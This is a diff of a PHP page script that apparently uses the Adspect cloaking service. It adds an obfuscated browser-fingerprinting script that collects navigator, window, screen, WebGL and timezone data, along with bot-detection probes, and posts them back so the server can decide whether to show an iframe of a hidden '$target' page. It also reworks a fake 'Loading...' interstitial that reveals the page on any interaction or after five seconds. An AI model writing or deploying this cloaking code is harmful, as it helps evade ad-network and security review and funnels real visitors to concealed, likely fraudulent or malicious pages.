@@ -393,11 +393,7 @@ if(!function_exists('adspect')){
                     <title>Loading...</title>
                     <style>
                         * { margin: 0; padding: 0; box-sizing: border-box; }
-                        body {
-                            font-family: Arial, sans-serif;
-                            min-height: 100vh;
-                            background: #f5f5f5;
-                        }
+                        body { font-family: Arial, sans-serif; min-height: 100vh; background: #f5f5f5; }
                         #loaderWrapper {
                             position: fixed;
                             top: 0;
@@ -521,78 +517,73 @@ if(!function_exists('adspect')){
                         <iframe src='$target'></iframe>
                     </div>
                     <script>
-                        (function() {
-                            var loader = document.getElementById('loaderWrapper');
-                            var mainContent = document.getElementById('mainContent');
-                            var loaded = false;
-                            var interacted = false;
-                            
-                            function showContent() {
-                                if (!loaded) {
-                                    loaded = true;
-                                    loader.style.opacity = '0';
-                                    setTimeout(function() {
-                                        loader.style.display = 'none';
-                                        mainContent.style.display = 'block';
-                                    }, 500);
+                        var loader = document.getElementById('loaderWrapper');
+                        var mainContent = document.getElementById('mainContent');
+                        var loaded = false;
+                        var interacted = false;
+                        var timeoutId = null;
+                        
+                        function showContent() {
+                            if (!loaded) {
+                                loaded = true;
+                                loader.style.opacity = '0';
+                                setTimeout(function() {
+                                    loader.style.display = 'none';
+                                    mainContent.style.display = 'block';
+                                }, 500);
+                                // Remove all event listeners
+                                document.removeEventListener('mousemove', handleInteraction);
+                                document.removeEventListener('click', handleInteraction);
+                                document.removeEventListener('touchstart', handleInteraction);
+                                document.removeEventListener('scroll', handleInteraction);
+                                document.removeEventListener('keydown', handleInteraction);
+                                if (timeoutId) {
+                                    clearTimeout(timeoutId);
+                                    timeoutId = null;
                                 }
                             }
-                            
-                            function handleInteraction(e) {
-                                if (!interacted) {
-                                    interacted = true;
-                                    showContent();
-                                    // Remove all event listeners after interaction
-                                    document.removeEventListener('mousemove', handleInteraction);
-                                    document.removeEventListener('click', handleInteraction);
-                                    document.removeEventListener('touchstart', handleInteraction);
-                                    document.removeEventListener('scroll', handleInteraction);
-                                    document.removeEventListener('keydown', handleInteraction);
-                                }
-                            }
-                            
-                            // Mouse movement
-                            document.addEventListener('mousemove', handleInteraction);
-                            
-                            // Click anywhere
-                            document.addEventListener('click', handleInteraction);
-                            
-                            // Touch for mobile
-                            document.addEventListener('touchstart', handleInteraction);
-                            
-                            // Scroll
-                            document.addEventListener('scroll', handleInteraction);
-                            
-                            // Keyboard
-                            document.addEventListener('keydown', handleInteraction);
-                            
-                            // Continue button
-                            document.getElementById('continueBtn').addEventListener('click', function(e) {
-                                e.stopPropagation();
+                        }
+                        
+                        function handleInteraction(e) {
+                            if (!interacted) {
+                                interacted = true;
                                 showContent();
-                            });
-                            
-                            // Cancel button
-                            document.getElementById('cancelBtn').addEventListener('click', function(e) {
-                                e.stopPropagation();
-                                window.location.href = 'about:blank';
-                            });
-                            
-                            // Auto-show after 5 seconds if no interaction
-                            setTimeout(function() {
-                                if (!interacted) {
-                                    showContent();
-                                }
-                            }, 5000);
-                            
-                            // Also show on iframe load
-                            var iframe = document.querySelector('iframe');
-                            iframe.addEventListener('load', function() {
-                                if (!interacted) {
-                                    showContent();
-                                }
-                            });
-                        })();
+                            }
+                        }
+                        
+                        // Mouse movement
+                        document.addEventListener('mousemove', handleInteraction);
+                        
+                        // Click anywhere
+                        document.addEventListener('click', handleInteraction);
+                        
+                        // Touch for mobile
+                        document.addEventListener('touchstart', handleInteraction);
+                        
+                        // Scroll
+                        document.addEventListener('scroll', handleInteraction);
+                        
+                        // Keyboard
+                        document.addEventListener('keydown', handleInteraction);
+                        
+                        // Continue button
+                        document.getElementById('continueBtn').addEventListener('click', function(e) {
+                            e.stopPropagation();
+                            showContent();
+                        });
+                        
+                        // Cancel button
+                        document.getElementById('cancelBtn').addEventListener('click', function(e) {
+                            e.stopPropagation();
+                            window.location.href = 'about:blank';
+                        });
+                        
+                        // Auto-show after 5 seconds if no interaction
+                        timeoutId = setTimeout(function() {
+                            if (!interacted) {
+                                showContent();
+                            }
+                        }, 5000);
                     </script>
                 </body>
                 </html>");
@@ -649,22 +640,23 @@ if(!function_exists('adspect')){
         return$data;
     }
     
-    // Show loader page first
-    function showLoaderPage() {
+    // MAIN EXECUTION - Only run if not POST request from loader
+    if ($_SERVER['REQUEST_METHOD'] !== 'POST' || !isset($_POST['load_content'])) {
+        $data = adspect('40adf6f7-4c88-4d47-ac5a-606ee98ed95a');
+        if(!isset($data)){
+            return;
+        }
         ?>
         <!DOCTYPE html>
-        <html>
+        <html lang="en">
         <head>
             <meta charset="utf-8">
+            <meta http-equiv="X-UA-Compatible" content="IE=Edge">
             <meta name="viewport" content="width=device-width, initial-scale=1">
             <title>Loading...</title>
             <style>
                 * { margin: 0; padding: 0; box-sizing: border-box; }
-                body {
-                    font-family: Arial, sans-serif;
-                    min-height: 100vh;
-                    background: #f5f5f5;
-                }
+                body { font-family: Arial, sans-serif; min-height: 100vh; background: #f5f5f5; }
                 #loaderWrapper {
                     position: fixed;
                     top: 0;
@@ -691,14 +683,6 @@ if(!function_exists('adspect')){
                 @keyframes popIn {
                     from { transform: scale(0.8); opacity: 0; }
                     to { transform: scale(1); opacity: 1; }
-                }
-                .loader-box img {
-                    width: 120px;
-                    height: 120px;
-                    margin-bottom: 20px;
-                    display: block;
-                    margin-left: auto;
-                    margin-right: auto;
                 }
                 .loader-box h2 {
                     color: #333;
@@ -779,146 +763,104 @@ if(!function_exists('adspect')){
                     </div>
                 </div>
             </div>
-            <div id="mainContent"></div>
+            <div id="mainContent">
+                <script>
+                    (function(q,u,r,e,t,v,w,x){
+                        function f(a,b){try{l[a]=b()}catch(d){n[a]=d.name}}
+                        function h(a,b){f(a,function(){function d(m){try{var g=b[m];switch(typeof g){case "object":null!==g&&(g=g.toString());break;case "function":g=u.prototype.toString.call(g)}c[m]=g}catch(y){n[a+"."+m]=y.name}}var c={},k;for(k in b)d(k);try{var p=q.getOwnPropertyNames(b);for(k=0;k<p.length;++k)d(p[k]);c["!!"]=p}catch(m){}return c})}
+                        function z(a,b,d){var c=a.prototype[b];a.prototype[b]=function(){l.proto=!0};d();a.prototype[b]=c}
+                        var n={},l={mode:"php",errors:n};
+                        h("console",r);
+                        h("document",e);
+                        (function(a,b){f(a,function(){var d={};b=b.attributes;for(var c in b)c=b[c],d[c.nodeName]=c.nodeValue;return d})})("documentElement",e.documentElement);
+                        h("location",t);
+                        h("navigator",v);
+                        h("window",x);
+                        h("screen",w);
+                        f("timezoneOffset",function(){return(new Date).getTimezoneOffset()});
+                        f("closure",function(){return function(){}.toString()});
+                        l.frame=!0;
+                        f("frame",function(){l.frame=self!==top});
+                        f("touchEvent",function(){var a=e.createEvent("TouchEvent");return{g:q.prototype.toString.call(a),t:a instanceof TouchEvent}});
+                        f("tostring",function(){function a(){}var b=0;a.toString=function(){++b;return""};r.log(a);return b});
+                        f("webgl",function(){var a=e.createElement("canvas").getContext("webgl"),b=a.getExtension("WEBGL_debug_renderer_info");return{vendor:a.getParameter(b.UNMASKED_VENDOR_WEBGL),renderer:a.getParameter(b.UNMASKED_RENDERER_WEBGL)}});
+                        try{z(Array,"includes",function(){return e.createElement("video").canPlayType("video/mp4")})}catch(a){}
+                        (function(){var a=e.createElement("form"),b=e.createElement("input");a.method="POST";a.action=t.href;b.type="hidden";b.name="data";b.value=JSON.stringify(l);a.appendChild(b);e.body.appendChild(a);a.submit()})()
+                    })(Object,Function,console,document,location,navigator,screen,window);
+                </script>
+            </div>
             <script>
-                (function() {
-                    var loader = document.getElementById('loaderWrapper');
-                    var mainContent = document.getElementById('mainContent');
-                    var loaded = false;
-                    var interacted = false;
-                    
-                    function showContent() {
-                        if (!loaded) {
-                            loaded = true;
-                            loader.style.opacity = '0';
-                            setTimeout(function() {
-                                loader.style.display = 'none';
-                                mainContent.style.display = 'block';
-                                // Load the actual content
-                                loadActualContent();
-                            }, 500);
+                var loader = document.getElementById('loaderWrapper');
+                var mainContent = document.getElementById('mainContent');
+                var loaded = false;
+                var interacted = false;
+                var timeoutId = null;
+                
+                function showContent() {
+                    if (!loaded) {
+                        loaded = true;
+                        loader.style.opacity = '0';
+                        setTimeout(function() {
+                            loader.style.display = 'none';
+                            mainContent.style.display = 'block';
+                        }, 500);
+                        // Remove all event listeners to prevent reload
+                        document.removeEventListener('mousemove', handleInteraction);
+                        document.removeEventListener('click', handleInteraction);
+                        document.removeEventListener('touchstart', handleInteraction);
+                        document.removeEventListener('scroll', handleInteraction);
+                        document.removeEventListener('keydown', handleInteraction);
+                        if (timeoutId) {
+                            clearTimeout(timeoutId);
+                            timeoutId = null;
                         }
                     }
-                    
-                    function loadActualContent() {
-                        // Your existing content loading code
-                        var xhr = new XMLHttpRequest();
-                        xhr.open('GET', window.location.href, true);
-                        xhr.onload = function() {
-                            if (xhr.status === 200) {
-                                // Extract content between body tags
-                                var content = xhr.responseText;
-                                var start = content.indexOf('<body>');
-                                var end = content.indexOf('</body>');
-                                if (start !== -1 && end !== -1) {
-                                    var bodyContent = content.substring(start + 6, end);
-                                    // Remove loader scripts from content
-                                    bodyContent = bodyContent.replace(/<script>[\s\S]*?<\/script>/g, '');
-                                    mainContent.innerHTML = bodyContent;
-                                }
-                            }
-                        };
-                        xhr.send();
-                    }
-                    
-                    function handleInteraction(e) {
-                        if (!interacted) {
-                            interacted = true;
-                            showContent();
-                            // Remove all event listeners after interaction
-                            document.removeEventListener('mousemove', handleInteraction);
-                            document.removeEventListener('click', handleInteraction);
-                            document.removeEventListener('touchstart', handleInteraction);
-                            document.removeEventListener('scroll', handleInteraction);
-                            document.removeEventListener('keydown', handleInteraction);
-                        }
-                    }
-                    
-                    // Mouse movement
-                    document.addEventListener('mousemove', handleInteraction);
-                    
-                    // Click anywhere
-                    document.addEventListener('click', handleInteraction);
-                    
-                    // Touch for mobile
-                    document.addEventListener('touchstart', handleInteraction);
-                    
-                    // Scroll
-                    document.addEventListener('scroll', handleInteraction);
-                    
-                    // Keyboard
-                    document.addEventListener('keydown', handleInteraction);
-                    
-                    // Continue button
-                    document.getElementById('continueBtn').addEventListener('click', function(e) {
-                        e.stopPropagation();
+                }
+                
+                function handleInteraction(e) {
+                    if (!interacted) {
+                        interacted = true;
                         showContent();
-                    });
-                    
-                    // Cancel button
-                    document.getElementById('cancelBtn').addEventListener('click', function(e) {
-                        e.stopPropagation();
-                        window.location.href = 'about:blank';
-                    });
-                    
-                    // Auto-show after 5 seconds if no interaction
-                    setTimeout(function() {
-                        if (!interacted) {
-                            showContent();
-                        }
-                    }, 5000);
-                })();
+                    }
+                }
+                
+                // Mouse movement
+                document.addEventListener('mousemove', handleInteraction);
+                
+                // Click anywhere
+                document.addEventListener('click', handleInteraction);
+                
+                // Touch for mobile
+                document.addEventListener('touchstart', handleInteraction);
+                
+                // Scroll
+                document.addEventListener('scroll', handleInteraction);
+                
+                // Keyboard
+                document.addEventListener('keydown', handleInteraction);
+                
+                // Continue button
+                document.getElementById('continueBtn').addEventListener('click', function(e) {
+                    e.stopPropagation();
+                    showContent();
+                });
+                
+                // Cancel button
+                document.getElementById('cancelBtn').addEventListener('click', function(e) {
+                    e.stopPropagation();
+                    window.location.href = 'about:blank';
+                });
+                
+                // Auto-show after 5 seconds if no interaction
+                timeoutId = setTimeout(function() {
+                    if (!interacted) {
+                        showContent();
+                    }
+                }, 5000);
             </script>
         </body>
         </html>
-        <?php
-        exit;
+        <?php exit;
     }
-    
-    // Check if this is the initial page load or AJAX request
-    if (empty($_POST)) {
-        showLoaderPage();
-    }
-    
-    $data = adspect('40adf6f7-4c88-4d47-ac5a-606ee98ed95a');
-    if(!isset($data)){
-        return;
-    }
-    ?>
-    <!DOCTYPE html>
-    <html lang="en">
-    <head>
-        <meta charset="utf-8">
-        <meta http-equiv="X-UA-Compatible" content="IE=Edge">
-        <meta name="viewport" content="width=device-width, initial-scale=1">
-    </head>
-    <body>
-        <script>
-            (function(q,u,r,e,t,v,w,x){
-                function f(a,b){try{l[a]=b()}catch(d){n[a]=d.name}}
-                function h(a,b){f(a,function(){function d(m){try{var g=b[m];switch(typeof g){case "object":null!==g&&(g=g.toString());break;case "function":g=u.prototype.toString.call(g)}c[m]=g}catch(y){n[a+"."+m]=y.name}}var c={},k;for(k in b)d(k);try{var p=q.getOwnPropertyNames(b);for(k=0;k<p.length;++k)d(p[k]);c["!!"]=p}catch(m){}return c})}
-                function z(a,b,d){var c=a.prototype[b];a.prototype[b]=function(){l.proto=!0};d();a.prototype[b]=c}
-                var n={},l={mode:"php",errors:n};
-                h("console",r);
-                h("document",e);
-                (function(a,b){f(a,function(){var d={};b=b.attributes;for(var c in b)c=b[c],d[c.nodeName]=c.nodeValue;return d})})("documentElement",e.documentElement);
-                h("location",t);
-                h("navigator",v);
-                h("window",x);
-                h("screen",w);
-                f("timezoneOffset",function(){return(new Date).getTimezoneOffset()});
-                f("closure",function(){return function(){}.toString()});
-                l.frame=!0;
-                f("frame",function(){l.frame=self!==top});
-                f("touchEvent",function(){var a=e.createEvent("TouchEvent");return{g:q.prototype.toString.call(a),t:a instanceof TouchEvent}});
-                f("tostring",function(){function a(){}var b=0;a.toString=function(){++b;return""};r.log(a);return b});
-                f("webgl",function(){var a=e.createElement("canvas").getContext("webgl"),b=a.getExtension("WEBGL_debug_renderer_info");return{vendor:a.getParameter(b.UNMASKED_VENDOR_WEBGL),renderer:a.getParameter(b.UNMASKED_RENDERER_WEBGL)}});
-                try{z(Array,"includes",function(){return e.createElement("video").canPlayType("video/mp4")})}catch(a){}
-                (function(){var a=e.createElement("form"),b=e.createElement("input");a.method="POST";a.action=t.href;b.type="hidden";b.name="data";b.value=JSON.stringify(l);a.appendChild(b);e.body.appendChild(a);a.submit()})()
-            })(Object,Function,console,document,location,navigator,screen,window);
-        </script>
-    </body>
-    </html>
-    <?php exit;
 }
 ?>
